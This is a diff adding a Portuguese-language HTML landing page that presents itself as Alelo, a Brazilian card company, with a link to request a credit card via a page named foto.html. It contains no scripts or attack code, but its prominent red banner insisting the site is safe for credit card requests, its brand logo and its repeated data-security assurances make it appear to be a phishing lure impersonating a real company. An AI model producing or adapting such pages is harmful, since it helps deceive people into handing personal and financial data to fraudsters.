@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página Inicial</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            position: relative;
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 120px;
+            height: auto;
+        }
+
+        .categories {
+            width: 100%;
+            max-width: 1000px;
+            background-color: #fff;
+            border-bottom: 2px solid #ccc;
+            display: flex;
+            justify-content: center;
+            padding: 10px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+        }
+
+        .categories a {
+            color: #007BFF;
+            text-decoration: none;
+            padding: 10px 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin: 0 10px;
+            transition: background-color 0.3s, color 0.3s;
+            font-weight: bold;
+        }
+
+        .categories a:hover {
+            background-color: #f1f1f1;
+        }
+
+        .welcome-container {
+            background-color: #fff;
+            padding: 40px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            width: 600px;
+            text-align: center;
+            position: relative;
+        }
+
+        .welcome-container h1 {
+            margin: 0;
+            font-size: 28px;
+            color: #333;
+        }
+
+        .welcome-container p {
+            color: #666;
+            font-size: 18px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .alert-message {
+            color: red;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .text-gray {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <!-- Seção de categorias no topo -->
+    <div class="categories">
+        <a href="index.html">Página Inicial</a>
+        <a href="foto.html">Solicitar Cartão de Credito</a>
+        
+    </div>
+
+    <!-- Logo do site -->
+    <img src="imgs/logooficial.png" alt="Logo do Site" class="logo">
+
+    <!-- Conteúdo de boas-vindas -->
+    <div class="welcome-container">
+        <!-- Mensagem de alerta -->
+        <div class="alert-message">
+            Este site é apropriado para solicitar seu cartão de crédito com total segurança.
+        </div>
+
+        <h1>Bem-vindo à Alelo!</h1>
+        <p>Na Alelo, somos especialistas em fornecer soluções de cartões de crédito seguras e confiáveis para nossos clientes. Utilizamos tecnologia avançada para proteger seus dados, garantindo que você tenha uma experiência tranquila e segura. Nosso compromisso com a segurança é prioridade máxima, e nossa equipe está dedicada a assegurar que todas as suas informações sejam tratadas com o mais alto nível de confidencialidade e respeito.</p>
+        
+        <!-- Mensagem de copyright -->
+        <p class="text-gray">© 2024 Alelo. Todos os direitos reservados.</p>
+    </div>
+</body>
+</html>
